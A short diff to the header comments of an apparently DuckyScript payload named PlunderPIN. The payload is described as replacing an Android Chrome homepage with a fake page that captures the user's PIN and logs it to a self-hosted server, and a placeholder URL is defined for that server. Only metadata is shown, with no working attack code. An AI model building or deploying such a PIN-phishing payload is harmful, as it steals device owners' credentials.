@@ -1,7 +1,7 @@
 REM TITLE: PlunderPIN
 REM AUTHOR: OSINTI4L (https://github.com/OSINTI4L)
 REM TARGET OS: Android mobile device/Google Chrome (tested on Samsung S24 FE | One UI V8.0 | Android 16 | Google Chrome 143.0.7499.53)
-REM DESCRIPTION: PlunderPIN is a mobile PIN phishing payload that replaces a user's Google Chrome Browser homepage with a malicious imitation homepage that creates prompts to log the user's PIN and log it to a self hosted Apache webserver. See README.md for full description.
+REM DESCRIPTION: PlunderPIN is a mobile PIN phishing payload that replaces a user's Google Chrome browser homepage with a malicious imitation homepage that creates prompts to capture the user's PIN and log it to a self hosted Apache webserver. See README.md for full description.
 REM REQUIREMENTS: See README.md
 
 DEFINE #Apache_URL http://shorturl.at/Place-URL-Here
